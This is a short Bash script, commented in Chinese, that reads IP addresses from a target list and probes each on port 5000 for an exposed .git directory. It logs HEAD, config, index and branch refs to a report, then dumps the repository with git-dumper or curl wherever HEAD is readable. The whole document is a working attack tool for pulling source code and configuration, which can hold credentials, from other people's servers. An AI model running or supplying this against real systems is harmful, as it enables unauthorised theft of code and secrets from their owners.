#!/usr/bin/env bash
set -euo pipefail
PORT=5000
OUT=git_leak_report.txt
: > "$OUT"

echo "🔍 扫描 .git 泄露..."
while read -r ip; do
  [[ -z "$ip" ]] && continue
  base="http://$ip:$PORT"
  echo "============================" | tee -a "$OUT"
  echo "📡 $ip" | tee -a "$OUT"

  # 探测几个关键对象
  for p in "/.git/HEAD" "/.git/config" "/.git/index" "/.git/refs/heads/master" "/.git/refs/heads/main"; do
    code=$(curl -m 4 -sk -o /tmp/g.out -w "%{http_code}" "$base$p" || true)
    if [[ "$code" =~ ^2|3 ]]; then
      echo "✅ 泄露: $base$p  [HTTP $code]" | tee -a "$OUT"
      head -c 200 /tmp/g.out | sed 's/[^[:print:]\t]/./g' | sed 's/^/    /' | tee -a "$OUT"
    else
      echo "ℹ️  $p  [HTTP $code]" >> "$OUT"
    fi
  done

  # 若 HEAD 拿到，尝试用 git-dumper（若环境无，可用 curl 递归拉取）
  if curl -m 4 -sk "$base/.git/HEAD" | grep -qi "ref:"; then
    dir="gitdump_$ip"
    echo "⏬ 尝试拉取仓库 -> $dir"
    if command -v git-dumper >/dev/null 2>&1; then
      git-dumper "$base/.git/" "$dir" || true
    else
      # 极简拉取（不完整，但够用）：只拉 HEAD、config 和 refs
      mkdir -p "$dir/.git/refs/heads"
      curl -m 4 -sk "$base/.git/HEAD" -o "$dir/.git/HEAD" || true
      curl -m 4 -sk "$base/.git/config" -o "$dir/.git/config" || true
      curl -m 4 -sk "$base/.git/refs/heads/main" -o "$dir/.git/refs/heads/main" || true
      curl -m 4 -sk "$base/.git/refs/heads/master" -o "$dir/.git/refs/heads/master" || true
      echo "   ✅ 已拉取关键引用文件（可手工补全或用工具重建）"
    fi
  fi
done < targets.txt

echo "✅ done. 查看 $OUT"
